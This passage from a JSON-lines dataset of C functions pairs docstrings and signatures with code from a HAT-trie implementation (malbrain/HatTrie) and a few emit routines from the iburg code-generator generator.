0; idx < HatPailMax; idx++ ) {\n\t    base = (HatBase *)(pail->array[idx] & HAT_mask);\n\n\t\tif( !base )\n\t\t  continue;\n\n  \t\tcnt = tst = 0;\n\n\t\twhile( tst < base->nxt ) {\n\t\t  len = base->keys[tst++];\n\n\t\t  if( len > 0x7f )\n\t\t\tlen &= 0x7f, len += base->keys[tst++] << 7;\n\n\t\t  hat_add_radix (hat, radix, base->keys + tst, len, (uchar *)base + HatSize[base->type] - (cnt + 1) * hat->aux);\n\t\t  tst += len;\n\t\t  cnt++;\n\t\t}\n\n\t\that_free (hat, base, base->type);\n\t  }\n\t  hat_free (hat, pail, HAT_pail);\n\t}\n\n  hat_free (hat, bucket, HAT_bucket);\n}", "path": "hattrie64d.c", "repo_name": "malbrain/HatTrie", "stars": 79, "license": "None", "language": "c", "size": 144}
{"docstring": "//\treturn key at current cursor location\n", "func_signal": "uint hat_key (HatCursor *cursor, uchar *buff, uint max)", "code": "{\nint idx, scan, len;\nuchar *key, ch;\nuint off = 0;\n\n\tmax--;\t// leave room for terminator\n\n\t//\tis cursor at EOF?\n\n\tif( cursor->top < 0 ) {\n\t  if( max )\n\t\tbuff[0] = 0;\n\t  return 0;\n\t}\n\n\t//\tfill in from triple root\n\t//\tand cascaded radix nodes\n\n\tfor( idx = 0; idx < cursor->top; idx++ )\n\t  if( !idx ) {\n\t\tfor( scan = cursor->rootlvl; scan--; )\n\t\t  if( ch = (cursor->rootscan >> scan * 7) & 0x7F )\n\t        if( off < max )\n\t\t      buff[off++] = ch;\n\t  } else if( off < max )\n\t\t  if( ch = cursor->scan[idx] ) // skip slot zero\n\t\t\tbuff[off++] = ch;\n\n\t//\tpull rest of key from current entry in sorted array\n\n\tkey = cursor->keys[cursor->idx].key;\n\tlen = *key++;\n\n\tif( len & 0x80 )\n\t\tlen &= 0x7f, len += *key++ << 7;\n\n\twhile( len-- && off < max )\n\t\tbuff[off++] = *key++;\n\n\tbuff[off] = 0;\n\treturn off;\n}", "path": "hattrie64d.c", "repo_name": "malbrain/HatTrie", "stars": 79, "license": "None", "language": "c", "size": 144}
{"docstring": "//\tcompute hash code for key\n", "func_signal": "uint hat_code (uchar *buff, uint max)", "code": "{\nuint hash = max;\n\n\twhile( max-- )\n\t\thash += (hash << 5) + (hash >> 27) + *buff++;\n\n\treturn hash;\n}", "path": "hattrie64d.c", "repo_name": "malbrain/HatTrie", "stars": 79, "license": "None", "language": "c", "size": 144}
{"docstring": "//\that_cell: add string to hat array\n//\treturning address of associated slot\n", "func_signal": "void *hat_cell (Hat *hat, uchar *buff, uint max)", "code": "{\nHatSlot *table, *next, *parent, node;\nHatBucket *bucket;\nHatBase *base;\nHatPail *pail;\nushort tst, cnt;\nuint triple = 0;\nuint len, code;\nuint off = 0;\nvoid *cell;\nuchar ch;\n\n  for( tst = 0; tst < hat->bootlvl; tst++ ) {\n\ttriple *= 128;\n\tif( off < max )\n\t  triple += buff[off++];\n  }\n\n  next = &hat->root[triple];\n  parent = NULL;\n\nloop:\n  while( node = *next )\n\tswitch( node & HAT_type ) {\n\tcase HAT_array:\n\t  base = (HatBase *)(node & HAT_mask);\n\t  cnt = tst = 0;\n\n\t  //  find slot == key\n\n\t  while( tst < base->nxt ) {\n\t\tlen = base->keys[tst++];\t// key length\n\n\t\tif( len > 0x7f )\n\t\t\tlen += base->keys[tst++] << 7;\n\n\t\tif( len == max - off )\n\t\t  if( !keycmp (base->keys + tst, buff + off, max - off) )\n\t\t\tif( hat->aux )\n\t\t\t  return (uchar *)base + HatSize[base->type] - (cnt + 1) * hat->aux;\n\t\t\telse\n\t\t\t  return (void *)1;\n\n\t\ttst += len;\n\t\tcnt++;\n\t  }\n\n\t  //  if parent node is a full bucket node,\n\t  //  burst it and loop to reprocess insert\n\n\t  if( parent ) {\n\t\tif( bucket->count++ < HatBucketMax )\n\t\t  if( cell = hat_add_array (hat, next, buff + off, max - off, 1) )\n\t\t\tif( hat->aux )\n\t\t\t  return cell;\n\t\t\telse\n\t\t\t  return (void *)0;\n\n\t\that_burst_bucket (hat, parent);\n\t\tnext = parent;\n\t\tparent = NULL;\n\t\tcontinue;\n\t  }\n\n\t  // add new key to existing array or create new pail array node\n\n\t  if( cell = hat_add_array (hat, next, buff + off, max - off, 1) )\n\t\tif( hat->aux )\n\t\t  return cell;\n\t\telse\n\t\t  return (void *)0;\n\n\t  //  burst full array node into HAT_bucket node\n\t  //  and loop to reprocess the insert\n\n\t  hat_burst_array (hat, next);\n\t  continue;\n\n\tcase HAT_pail:\n\t  pail = (HatPail *)(node & HAT_mask);\n\n\t  //  find slot == key\n\n\t  cnt = tst = 0;\n\t  code = hat_code (buff + off, max - off) % HatPailMax;\n\n\t  if( base = (HatBase *)(pail->array[code] & HAT_mask) )\n\t    while( tst < base->nxt ) {\n\t\t len = base->keys[tst++];\t// key length\n\n\t\t if( len > 0x7f )\n\t\t  len += base->keys[tst++] << 7;\n\n\t\t if( len == max - off )\n\t\t  if( !keycmp (base->keys + tst, buff + off, max - off) )\n\t\t\tif( hat->aux )\n\t\t\t  return (uchar *)base + HatSize[base->type] - (cnt + 1) * hat->aux;\n\t\t\telse\n\t\t\t  return (void *)1;\n\n\t\t tst += len;\n\t\t cnt++;\n\t    }\n\n\t  //  if parent node is a full bucket node,\n\t  //  burst it and loop to reprocess insert\n\n\t if( parent ) {\n\t\tif( bucket->count++ < HatBucketMax )\n\t\t  if( cell = hat_add_pail (hat, next, buff + off, max - off) )\n\t\t\tif( hat->aux )\n\t\t\t  return cell;\n\t\t\telse\n\t\t\t  return (void *)0;\n\n\t\that_burst_bucket (hat, parent);\n\t\tnext = parent;\n\t\tparent = NULL;\n\t\tcontinue;\n\t  }\n\n\t  if( cell = hat_add_pail (hat, next, buff + off, max - off) )\n\t\tif( hat->aux )\n\t\t  return cell;\n\t\telse\n\t\t  return (void *)0;\n\n\t  //  burst full pail node into HAT_bucket node\n\t  //  and loop to reprocess the insert\n\n\t  hat_burst_pail (hat, next);\n\t  continue;\n\n\tcase HAT_bucket:\n\t  bucket = (HatBucket *)(node & HAT_mask);\n\t  code = hat_code (buff + off, max - off) % HatBucketSlots;\n\n\t  parent = next;\n\t  next = &bucket->slots[code];\n\t  continue;\n\n\tcase HAT_radix:\n\t  table = (HatSlot *)(node & HAT_mask);\n\n\t  if( off < max )\n\t  \tch = buff[off++];\n\t  else\n\t  \tch = 0;\n\n\t  next = &table[ch];\n\t  continue;\n\t}\n\n\t// place new array node under HAT_bucket\n\t//\tloop if bucket overflows\n\n\tif( parent )\n\t  if( bucket->count++ < HatBucketMax ) {\n\t   if( cell = hat_new_array (hat, next, buff + off, max - off) )\n\t\tif( hat->aux )\n\t\t  return cell;\n\t\telse\n\t\t  return (void *)0;\n\n\t   hat_burst_bucket (hat, parent);\n\t   next = parent;\n\t   parent = NULL;\n\t   goto loop;\n\t}\n\n\t// place new array node under HAT_radix\n\n\tcell = hat_new_array (hat, next, buff + off, max - off);\n\n\tif( hat->aux )\n\t\treturn cell;\n\n\treturn (void *)0;\n}", "path": "hattrie64d.c", "repo_name": "malbrain/HatTrie", "stars": 79, "license": "None", "language": "c", "size": 144}
{"docstring": "//\that_find: find string in hat array\n//\treturning a pointer to associated slot\n", "func_signal": "void *hat_find (Hat *hat, uchar *buff, uint max)", "code": "{\nHatSlot next, *table;\nHatBucket *bucket;\nHatBase *base;\nHatPail *pail;\nushort tst, cnt;\nuint triple = 0;\nuint code, len;\nuint off = 0;\nuchar ch;\n\n  for( tst = 0; tst < hat->bootlvl; tst++ ) {\n\ttriple *= 128;\n\tif( off < max )\n\t  triple += buff[off++];\n  }\n\n  next = hat->root[triple];\n\n  while( next )\n\tswitch( next & HAT_type ) {\n\tcase HAT_array:\n\t  base = (HatBase *)(next & HAT_mask);\n\t  cnt = tst = 0;\n\t  Searches++;\n\n\t  //  find slot == key\n\n\t  while( tst < base->nxt ) {\n\t\tProbes++;\n\t\tlen = base->keys[tst++];\t// key length\n\n\t\tif( len > 0x7f )\n\t\t\tlen += base->keys[tst++] << 7;\n\n\t\tif( len == max - off )\n\t\t  if( !keycmp (base->keys + tst, buff + off, len) )\n\t\t\tif( hat->aux )\n\t\t\t  return (uchar *)base + HatSize[base->type] - (cnt + 1) * hat->aux;\n\t\t\telse\n\t\t\t  return (void *)1;\n\t\ttst += len;\n\t\tcnt++;\n\t  }\n\n\t  return NULL;\n\n\tcase HAT_pail:\n\t  pail = (HatPail *)(next & HAT_mask);\n\t  Pail++;\n\n\t  code = hat_code (buff + off, max - off) % HatPailMax;\n\n\t  if( next = pail->array[code] )\n\t\tcontinue;\n\n\t  return NULL;\n\n\tcase HAT_bucket:\n\t  bucket = (HatBucket *)(next & HAT_mask);\n\t  Bucket++;\n\n\t  code = hat_code (buff + off, max - off) % HatBucketSlots;\n\n\t  if( next = bucket->slots[code] )\n\t\tcontinue;\n\n\t  return NULL;\n\n\tcase HAT_radix:\n\t  table = (HatSlot *)(next & HAT_mask);\n\t  Radix++;\n\n\t  if( off < max )\n\t\tch = buff[off++];\n\t  else\n\t\tch = 0;\n\n\t  next = table[ch];\n\t  continue;\n\t}\n\n\treturn NULL;\n}", "path": "hattrie64d.c", "repo_name": "malbrain/HatTrie", "stars": 79, "license": "None", "language": "c", "size": 144}
{"docstring": "//\tallocate hat node\n", "func_signal": "void *hat_alloc (Hat *hat, uint type)", "code": "{\nuint amt, idx, round;\nHatSeg *seg;\nvoid *block;\n\n\tamt = HatSize[type];\n\that->counts[type]++;\n\n\tif( amt & (HAT_cache_line - 1) )\n\t\tamt |= (HAT_cache_line - 1), amt += 1;\n\n\t//\tsee if free block is already available\n\n\tif( (block = hat->reuse[type]) ) {\n\t\that->reuse[type] = *(void **)block;\n\t\tmemset (block, 0, amt);\n\t\treturn (void *)block;\n\t}\n\n\tif( hat->seg->next + amt > HAT_seg ) {\n\t\tif( (seg = malloc (HAT_seg)) ) {\n\t\t\tseg->next = sizeof(*seg);\n\t\t\tseg->seg = hat->seg;\n\t\t\that->seg = seg;\n\t\t\tif( round = (HatSlot)seg & (HAT_cache_line - 1) )\n\t\t\t\tseg->next += HAT_cache_line - round;\n\t\t} else {\n\t\t\that_abort(\"Out of virtual memory\");\n\t\t}\n\n\t\tMaxMem += HAT_seg;\n\t}\n\n\tblock = (void *)((uchar *)hat->seg + hat->seg->next);\n\that->seg->next += amt;\n\tmemset (block, 0, amt);\n\n\treturn block;\n}", "path": "hattrie64d.c", "repo_name": "malbrain/HatTrie", "stars": 79, "license": "None", "language": "c", "size": 144}
{"docstring": "//\tadvance cursor to last key in the trie\n//\treturning false if tree is empty\n", "func_signal": "int hat_last (HatCursor *cursor)", "code": "{\nHatSlot *radix, next, *root;\nuint idx, max;\nuchar ch;\n\n\t//\tfind last root\n\t//\tor return if tree is empty\n\n\tcursor->rootscan = cursor->maxroot;\n\troot = (HatSlot *)(cursor->next[0]);\n\tcursor->top = 0;\n\n\twhile( cursor->rootscan )\n\t if( next = root[--cursor->rootscan] )\n\t  break;\n\t else if( !cursor->rootscan )\n\t  return 0;\n\t  \n\tcursor->next[++cursor->top] = next;\n\nloop:\n\tif( (cursor->next[cursor->top] & HAT_type) == HAT_radix ) {\n\t\tradix = (HatSlot *)(cursor->next[cursor->top] & HAT_mask);\n\t\tch = 128;\n\n\t\twhile( ch-- )\n\t\t  if( radix[ch] ) {\n\t\t\tcursor->scan[cursor->top] = ch;\n\t\t    cursor->next[++cursor->top] = radix[ch];\n\t\t\tgoto loop;\n\t\t  }\n\t}\n\n\that_sort (cursor);\n  \tcursor->idx = cursor->cnt - 1;\n\treturn 1;\n}", "path": "hattrie64d.c", "repo_name": "malbrain/HatTrie", "stars": 79, "license": "None", "language": "c", "size": 144}
{"docstring": "//\tdemonstration sort program\n", "func_signal": "void sorthattrie (int lvl, FILE *in)", "code": "{\nHat *hat = hat_open (lvl, sizeof(uint));\nuchar buff[256];\nvoid *cursor;\nuint *cell;\nuint max;\n\t\n\twhile( fgets (buff, sizeof(buff), in) ) {\n\t\tmax = strlen(buff);\n\t\twhile( max-- )\n\t\t\tbuff[max] &= 0x7f;\n\t\tcell = hat_cell (hat, buff, strlen(buff) - 1);\n\t\t*cell += 1;\n\t}\n\n\tcursor = hat_cursor (hat);\n\n#ifndef REVERSE\n\tif( hat_start (cursor, NULL, 0) )\n\t  do {\n\t\that_key (cursor, buff, sizeof(buff));\n\t\tcell = hat_slot (cursor);\n\t\tmax = *cell;\n\t\twhile( max-- )\n\t\t\tputs (buff);\n\t  } while( hat_nxt (cursor) );\n#else\n\tif( hat_last (cursor) )\n\t  do {\n\t\that_key (cursor, buff, sizeof(buff));\n\t\tcell = hat_slot (cursor);\n\t\tmax = *cell;\n\t\twhile( max-- )\n\t\t\tputs (buff);\n\t  } while( hat_prv (cursor) );\n#endif\n\tif( cursor )\n\t\tfree (cursor);\n\n\texit(0);\n}", "path": "hattrie64d.c", "repo_name": "malbrain/HatTrie", "stars": 79, "license": "None", "language": "c", "size": 144}
{"docstring": "//\tternery quick sort of cursor's keys\n//\tmodelled after R Sedgewick's\n//\t\"Quicksort with 3-way partitioning\"\n", "func_signal": "vecswap (int i, int j, int n, HatSort *x)", "code": "{\nHatSort swap[1];\n\n\twhile( n-- ) {\n\t\t*swap = x[i];\n\t\tx[i++] = x[j];\n\t\tx[j++] = *swap;\n\t}\t\n}", "path": "hattrie64d.c", "repo_name": "malbrain/HatTrie", "stars": 79, "license": "None", "language": "c", "size": 144}
{"docstring": "//\tburst HAT_bucket node node into HAT_radix entry\n//\tmoving key over one offset\n", "func_signal": "void hat_add_radix (Hat *hat, HatSlot *radix, uchar *buff, uint max, uchar *value)", "code": "{\nvoid *cell;\nuchar ch;\n\n  //  shorten key by 1 byte\n\n  if( max )\n\tch = buff[0];\n  else\n\tch = 0;\n\n  //  if radix slot is empty, create new HAT_array node\n\n  if( !radix[ch] ) {\n\tcell = hat_new_array (hat, &radix[ch], buff + 1, max ? max - 1 : 0);\n\tif( hat->aux )\n\t\tmemcpy (cell, value, hat->aux);\n\treturn;\n  }\n\n  //  otherwise, add to existing node\n\n  do switch( radix[ch] & HAT_type ) {\n\tcase HAT_bucket:\n\t  if( hat_add_bucket (hat, &radix[ch], buff + 1, max - 1, value) )\n\t\treturn;\n\n\t  hat_burst_bucket (hat, &radix[ch]);\n\t  continue;\n\n\tcase HAT_radix:\n\t  radix = (HatSlot *)(radix[ch] & HAT_mask);\n\t  hat_add_radix (hat, radix, buff + 1, max - 1, value);\n\t  return;\n\n\tcase HAT_array:\n\t  if( cell = hat_add_array (hat, &radix[ch], buff + 1, max - 1, 1) ) {\n\t\tif( hat->aux )\n\t\t\tmemcpy (cell, value, hat->aux);\n\t\treturn;\n\t  }\n\n\t  hat_burst_array (hat, &radix[ch]);\n\t  continue;\n\n\tcase HAT_pail:\n\t  if( cell = hat_add_pail (hat, &radix[ch], buff + 1, max - 1) ) {\n\t\tif( hat->aux )\n\t\t\tmemcpy (cell, value, hat->aux);\n\t\treturn;\n\t  }\n\n\t  hat_burst_pail (hat, &radix[ch]);\n\t  continue;\n  } while( 1 );\n}", "path": "hattrie64d.c", "repo_name": "malbrain/HatTrie", "stars": 79, "license": "None", "language": "c", "size": 144}
{"docstring": "//\tadd new key to existing HAT_pail node\n//\treturn auxilliary area pointer, or\n//\tNULL if it doesn't fit PAIL array\n", "func_signal": "void *hat_add_pail (Hat *hat, HatSlot *parent, uchar *buff, uint amt)", "code": "{\nHatPail *pail = (HatPail *)(*parent & HAT_mask);\nuint slot = hat_code (buff, amt) % HatPailMax;\nvoid *cell;\n\n\tif( !pail->array[slot] )\n\t\treturn hat_new_array (hat, &pail->array[slot], buff, amt);\n\n\t//\tdoes room exist in slot?\n\n\tif( cell = hat_add_array (hat, &pail->array[slot], buff, amt, 0) )\n\t\treturn cell;\n\n\treturn NULL;\n}", "path": "hattrie64d.c", "repo_name": "malbrain/HatTrie", "stars": 79, "license": "None", "language": "c", "size": 144}
{"docstring": "//\tburst overflowing HAT_pail hash table into HAT_bucket hash table\n", "func_signal": "void hat_burst_pail (Hat *hat, HatSlot *parent)", "code": "{\nHatPail *pail = (HatPail *)(*parent & HAT_mask);\nushort tst, len, type, cnt, idx;\nHatBucket *bucket;\nHatBase *base;\nuchar *cell;\nuint code;\n\n\t//\tallocate new bucket node\n\n\tbucket = hat_alloc (hat, HAT_bucket);\n\t*parent = (HatSlot)bucket | HAT_bucket;\n\n\t//\tburst pail array into new bucket node\n\n\tfor( idx = 0; idx < HatPailMax; idx++ ) {\n\t base = (HatBase *)(pail->array[idx] & HAT_mask);\n\t if( !base )\n\t\tcontinue;\n\n\t cnt = tst = 0;\n\n\t while( tst < base->nxt ) {\n\t  len = base->keys[tst++];\n\n\t  if( len & 0x80 )\n\t\tlen &= 0x7f, len += base->keys[tst++] << 7;\n\n\t  code = hat_code (base->keys + tst, len) % HatBucketSlots;\n\n\t  if( bucket->slots[code] ) {\n\t\tif( (bucket->slots[code] & HAT_type) == HAT_array ) {\n\t\t  cell = hat_add_array (hat, &bucket->slots[code], base->keys + tst, len, 1);\n\t\t  if( hat->aux )\n\t\t\tmemcpy (cell, (uchar *)base + HatSize[base->type] - (cnt + 1) * hat->aux, hat->aux);\n\t\t} else {\n\t\t  cell = hat_add_pail (hat, &bucket->slots[code], base->keys + tst, len);\n\t\t  if( hat->aux )\n\t\t\tmemcpy (cell, (uchar *)base + HatSize[base->type] - (cnt + 1) * hat->aux, hat->aux);\n\t\t}\n\t  } else {\n\t\t  cell = hat_new_array (hat, &bucket->slots[code], base->keys + tst, len);\n\t\t  if( hat->aux )\n\t\t\tmemcpy (cell, (uchar *)base + HatSize[base->type] - (cnt + 1) * hat->aux, hat->aux);\n\t  }\n\n\t   bucket->count++;\n\t   tst += len;\n\t   cnt++;\n\t }\n\n\t hat_free (hat, base, base->type);\n\t}\n   hat_free (hat, pail, HAT_pail);\n}", "path": "hattrie64d.c", "repo_name": "malbrain/HatTrie", "stars": 79, "license": "None", "language": "c", "size": 144}
{"docstring": "// void hat_abort (char *msg) __attribute__ ((noreturn)); // Tell static analyser that this function will not return\n", "func_signal": "void hat_abort (char *msg)", "code": "{\n\tfprintf(stderr, \"%s\\n\", msg);\n\texit(1);\n}", "path": "hattrie64d.c", "repo_name": "malbrain/HatTrie", "stars": 79, "license": "None", "language": "c", "size": 144}
{"docstring": "//\tcreate new HAT_pail node\n//\tfrom full HAT array node\n//\tby bursting it\n", "func_signal": "void *hat_new_pail (Hat *hat, HatSlot *parent, uchar *buff, uint amt)", "code": "{\nHatBase *base = (HatBase *)(*parent & HAT_mask);\nushort tst = 0, len, cnt = 0;\nHatPail *pail;\nuchar *cell;\nuint code;\n\n\t// strip array node keys into HAT_pail structure\n\n\tpail = hat_alloc (hat, HAT_pail);\n\t*parent = (HatSlot)pail | HAT_pail;\n\n\t//\tburst array node into new PAIL node\n\n\twhile( tst < base->nxt ) {\n\t  len = base->keys[tst++];\n\n\t  if( len & 0x80 )\n\t\tlen &= 0x7f, len += base->keys[tst++] << 7;\n\n\t  code = hat_code (base->keys + tst, len) % HatPailMax;\n\n\t  if( pail->array[code] ) {\n\t\tcell = hat_add_array (hat, &pail->array[code], base->keys + tst, len, 0);\n\t\tif( hat->aux )\n\t\t\tmemcpy(cell, (uchar *)base + HatSize[base->type] - (cnt + 1) * hat->aux, hat->aux);\n\t  } else {\n\t\tcell = hat_new_array (hat, &pail->array[code], base->keys + tst, len);\n\t\tif(  hat->aux )\n\t\t\tmemcpy (cell, (uchar *)base + HatSize[base->type] - (cnt + 1) * hat->aux, hat->aux);\n\t  }\n\n\t  tst += len;\n\t  cnt++;\n\t}\n\n\that_free (hat, base, base->type);\n\treturn hat_add_pail (hat, parent, buff, amt);\n}", "path": "hattrie64d.c", "repo_name": "malbrain/HatTrie", "stars": 79, "license": "None", "language": "c", "size": 144}
{"docstring": "//\tfind and sort current node entry\n//  either Bucket or Array\n", "func_signal": "void hat_sort (HatCursor *cursor)", "code": "{\nHatBucket *bucket;\nuint off, idx;\nuchar len, ch;\nuint cnt;\n\n  switch( cursor->next[cursor->top] & HAT_type ) {\n  case HAT_array:\n\tcursor->cnt = hat_strip_array (cursor, cursor->next[cursor->top], cursor->keys);\n\tbreak;\n\n  case HAT_pail:\n\tcursor->cnt = hat_strip_pail (cursor, cursor->next[cursor->top], cursor->keys);\n\tbreak;\n\n  case HAT_bucket:\n\tbucket = (HatBucket *)(cursor->next[cursor->top] & HAT_mask);\n\tcursor->cnt = 0;\n\n\tfor( idx = 0; idx < HatBucketSlots; idx++ )\n\t  switch( bucket->slots[idx] & HAT_type ) {\n\t  case HAT_array:\n\t\tcursor->cnt += hat_strip_array (cursor, bucket->slots[idx], cursor->keys + cursor->cnt);\n\t\tcontinue;\n\t  case HAT_pail:\n\t\tcursor->cnt += hat_strip_pail (cursor, bucket->slots[idx], cursor->keys + cursor->cnt);\n\t\tcontinue;\n\t  }\n\n\tbreak;\n\n  }\n\n  hat_qsort (cursor->keys, cursor->cnt, 0);\n}", "path": "hattrie64d.c", "repo_name": "malbrain/HatTrie", "stars": 79, "license": "None", "language": "c", "size": 144}
{"docstring": "//\topen hat object\n//\tcall with number of radix levels to boot into root\n//\tand number of auxilliary user bytes to assign to each key\n", "func_signal": "void *hat_open (int boot, int aux)", "code": "{\nuint amt, size = HAT_slot_size, round;\nHatSeg *seg;\nHat *hat;\nint idx;\n\n\tfor( idx = 0; idx < boot; idx++ )\n\t\tsize *= 128;\n\n\tamt = sizeof(Hat) + size;\n\n\tif( amt & (HAT_cache_line - 1) )\n\t\tamt |= HAT_cache_line - 1, amt++;\n\n\tif( (seg = malloc(amt + HAT_seg)) ) {\n\t\tseg->next = sizeof(*seg);\n\t\tseg->seg = NULL;\n\t\tif( round = (HatSlot)seg & (HAT_cache_line - 1) )\n\t\t\tseg->next += HAT_cache_line - round;\n\t} else {\n\t\that_abort (\"No virtual memory\");\n\t}\n\n\tMaxMem += amt + HAT_seg;\n\n\that = (Hat *)((uchar *)seg + HAT_seg);\n\n\tmemset(hat, 0, amt);\n\that->bootlvl = boot;\n \that->aux = aux;\n \that->seg = seg;\n\n\tif( !boot )\n\t\t*hat->root = (HatSlot)hat_alloc (hat, HAT_bucket) | HAT_bucket;\n\n\treturn hat;\n}", "path": "hattrie64d.c", "repo_name": "malbrain/HatTrie", "stars": 79, "license": "None", "language": "c", "size": 144}
{"docstring": "//\tstrip out pointers from HAT_array node\n//\tto elements of the sorted array\n", "func_signal": "int hat_strip_array (HatCursor *cursor, HatSlot node, HatSort *list)", "code": "{\nHatBase *base = (HatBase *)(node & HAT_mask);\nuint size = HatSize[base->type];\nushort tst = 0;\nushort cnt = 0;\nushort len;\n\n  while( tst < base->nxt ) {\n\tlist[cnt].slot = (uchar *)base + size - (cnt+1) * cursor->aux;\n\tlist[cnt].key = base->keys + tst;\n\tlen = base->keys[tst++];\n\tif( len & 0x80 )\n\t\tlen &= 0x7f, len += base->keys[tst++] << 7;\n\ttst += len;\n\tcnt++;\n  }\n\n  return cnt;\n}", "path": "hattrie64d.c", "repo_name": "malbrain/HatTrie", "stars": 79, "license": "None", "language": "c", "size": 144}
{"docstring": "//\tpromote full array nodes to next larger size\n//\tif configured, overflow to HAT_pail node\n", "func_signal": "void *hat_promote (Hat *hat, HatSlot *parent, uchar *buff, int amt, int pail)", "code": "{\nHatBase *base = (HatBase *)(*parent & HAT_mask);\nuchar *oldslots, *newslots;\nushort tst, len, skip;\nuint type, oldtype;\nHatBase *newbase;\n\n\tif( amt > 0x7f )\n\t\tskip = 2;\n\telse\n\t\tskip = 1;\n\n\toldtype = type = base->type;\n\toldslots = (uchar *)base + HatSize[type];\n\n\t//\tcalculate new array node big enough to contain keys\n\t//\tand associated slots\n\n\tif( !hat->aux || base->cnt < 255 )\n\t  do if( (base->cnt + 1) * hat->aux + base->nxt + amt + skip + sizeof(HatBase) > HatSize[type] )\n\t\tcontinue;\n\t   else\n\t\tbreak;\n\t  while( type++ < HatMax );\n\telse\n\t  type = HatMax + 1;\n\n\t//  see if new key fits into largest array\n\t//\tif not, promote to HAT_pail as configured\n\n\tif( type > HatMax )\n\t  if( pail && HatPailMax )\n\t\treturn hat_new_pail (hat, parent, buff, amt);\n\t  else\n\t\treturn NULL;\n\n\t// promote node to next larger size\n\n\tnewbase = hat_alloc (hat, type);\n\t*parent = (HatSlot)newbase | HAT_array;\n\tnewslots = (uchar *)newbase + HatSize[type];\n\n\t//\tcopy old node contents\n\n\tmemcpy (newbase->keys, base->keys, base->nxt);\t// copy keys in node\n\n\tif( hat->aux )\n\t\tmemcpy (newslots - base->cnt * hat->aux, oldslots - base->cnt * hat->aux, base->cnt * hat->aux);\t//\tcopy user slots\n\n\t//\tappend new node\n\n\ttst = base->nxt;\n\tnewbase->keys[tst] = amt & 0x7f;\n\n\tif( amt & 0x80 )\n\t\tnewbase->keys[tst] |= 0x80, newbase->keys[tst + 1] = amt >> 7;\n\n\tmemcpy (newbase->keys + tst + skip, buff, amt);\n\n\tnewbase->nxt = tst + amt + skip;\n\tnewbase->cnt = base->cnt + 1;\n\tnewbase->type = type;\n\n\that_free (hat, base, oldtype);\n\treturn newslots - newbase->cnt * hat->aux;\n}", "path": "hattrie64d.c", "repo_name": "malbrain/HatTrie", "stars": 79, "license": "None", "language": "c", "size": 144}
{"docstring": "/* emitrule - emit decoding vectors and burm_rule */\n", "func_signal": "static void emitrule(Nonterm nts)", "code": "{\n\tNonterm p;\n\n\tfor (p = nts; p; p = p->link) {\n\t\tRule r;\n\t\tprint(\"static short %Pdecode_%S[] = {\\n%10,\\n\", p);\n\t\tfor (r = p->rules; r; r = r->decode)\n\t\t\tprint(\"%1%d,\\n\", r->ern);\n\t\tprint(\"};\\n\\n\");\n\t}\n\tprint(\"int %Prule(STATE_TYPE state, int goalnt) {\\n\"\n\"%1%Passert(goalnt >= 1 && goalnt <= %d, PANIC(\\\"Bad goal nonterminal %%d in %Prule\\\\n\\\", goalnt));\\n\"\n\"%1if (!state)\\n%2return 0;\\n%1switch (goalnt) {\\n\", ntnumber);\n\tfor (p = nts; p; p = p->link)\n\t\tprint(\"%1case %P%S_NT:\"\n\"%1return %Pdecode_%S[((struct %Pstate *)state)->rule.%P%S];\\n\", p, p, p);\n\tprint(\"%1default:\\n%2%Passert(0, PANIC(\\\"Bad goal nonterminal %%d in %Prule\\\\n\\\", goalnt));\\n%1}\\n%1return 0;\\n}\\n\\n\");\n}", "path": "iburg.c", "repo_name": "drh/iburg", "stars": 84, "license": "other", "language": "c", "size": 216}
{"docstring": "/* emitheader - emit initial definitions */\n", "func_signal": "static void emitheader(void)", "code": "{\n\tprint(\"#include <limits.h>\\n#include <stdlib.h>\\n\");\n\tprint(\"#ifndef STATE_TYPE\\n#define STATE_TYPE int\\n#endif\\n\");\n\tprint(\"#ifndef ALLOC\\n#define ALLOC(n) malloc(n)\\n#endif\\n\"\n\"#ifndef %Passert\\n#define %Passert(x,y) if (!(x)) { y; abort(); }\\n#endif\\n\\n\");\n\tif (Tflag)\n\t\tprint(\"static NODEPTR_TYPE %Pnp;\\n\\n\");\n}", "path": "iburg.c", "repo_name": "drh/iburg", "stars": 84, "license": "other", "language": "c", "size": 216}
{"docstring": "/* hash - return hash number for str */\n", "func_signal": "static unsigned hash(char *str)", "code": "{\n\tunsigned h = 0;\n\n\twhile (*str)\n\t\th = (h<<1) + *str++;\n\treturn h;\n}", "path": "iburg.c", "repo_name": "drh/iburg", "stars": 84, "license": "other", "language": "c", "size": 216}
{"docstring": "/* emitstring - emit array of rules and costs */\n", "func_signal": "static void emitstring(Rule rules)", "code": "{\n\tRule r;\n\tint k;\n\n\tprint(\"short %Pcost[][4] = {\\n\");\n\tfor (k = 0, r = rules; r; r = r->link) {\n\t\tfor ( ; k < r->ern; k++)\n\t\t\tprint(\"%1{ 0 },%1/* %d */\\n\", k);\n\t\tprint(\"%1{ %d },%1/* %d = %R */\\n\", r->cost, k++, r);\n\t}\n\tprint(\"};\\n\\nchar *%Pstring[] = {\\n\");\n\tfor (k = 0, r = rules; r; r = r->link) {\n\t\tfor ( ; k < r->ern; k++)\n\t\t\tprint(\"%1/* %d */%10,\\n\", k);\n\t\tprint(\"%1/* %d */%1\\\"%R\\\",\\n\", k++, r);\n\t}\n\tprint(\"};\\n\\n\");\n}", "path": "iburg.c", "repo_name": "drh/iburg", "stars": 84, "license": "other", "language": "c", "size": 216}
{"docstring": "/* emitfuncs - emit functions to access node fields */\n", "func_signal": "static void emitfuncs(void)", "code": "{\n\tprint(\"int %Pop_label(NODEPTR_TYPE p) {\\n\"\n\"%1%Passert(p, PANIC(\\\"NULL tree in %Pop_label\\\\n\\\"));\\n\"\n\"%1return OP_LABEL(p);\\n}\\n\\n\");\n\tprint(\"STATE_TYPE %Pstate_label(NODEPTR_TYPE p) {\\n\"\n\"%1%Passert(p, PANIC(\\\"NULL tree in %Pstate_label\\\\n\\\"));\\n\"\n\"%1return STATE_LABEL(p);\\n}\\n\\n\");\n\tprint(\"NODEPTR_TYPE %Pchild(NODEPTR_TYPE p, int index) {\\n\"\n\"%1%Passert(p, PANIC(\\\"NULL tree in %Pchild\\\\n\\\"));\\n\"\n\"%1switch (index) {\\n%1case 0:%1return LEFT_CHILD(p);\\n\"\n\"%1case 1:%1return RIGHT_CHILD(p);\\n%1}\\n\"\n\"%1%Passert(0, PANIC(\\\"Bad index %%d in %Pchild\\\\n\\\", index));\\n%1return 0;\\n}\\n\\n\");\n}", "path": "iburg.c", "repo_name": "drh/iburg", "stars": 84, "license": "other", "language": "c", "size": 216}
